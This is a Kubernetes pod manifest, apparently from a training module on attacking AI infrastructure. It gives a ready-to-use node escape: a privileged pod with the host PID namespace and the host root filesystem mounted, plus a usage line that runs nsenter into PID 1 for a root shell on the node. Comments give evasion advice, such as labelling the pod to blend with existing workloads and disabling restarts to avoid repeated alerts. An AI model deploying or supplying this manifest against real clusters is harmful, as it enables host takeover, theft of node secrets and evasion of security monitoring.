# Script: k8s_escape_pod.yaml
# Module: 09 — AI Infrastructure and Deployment Exploits
# Purpose: Privileged pod manifest for Kubernetes node escape via nsenter
# Usage: kubectl apply -f k8s_escape_pod.yaml -n <target-namespace>
#        kubectl exec -it node-escape -n <ns> -- nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# Target: K8s cluster where SA has pod create permissions
# WARNING: This creates a privileged pod — will trigger security alerts

apiVersion: v1
kind: Pod
metadata:
  name: node-escape
  namespace: production   # change to target namespace
  labels:
    app: debug-utils      # blend with existing workloads
spec:
  hostPID: true           # share host PID namespace — required for nsenter
  containers:
  - name: shell
    image: ubuntu:22.04   # or any image with nsenter
    securityContext:
      privileged: true    # required for nsenter --target 1
    command: ["sleep", "infinity"]
    # Mount host root for direct filesystem access (alternative to nsenter)
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
  restartPolicy: Never    # don't restart — avoid repeated alerts
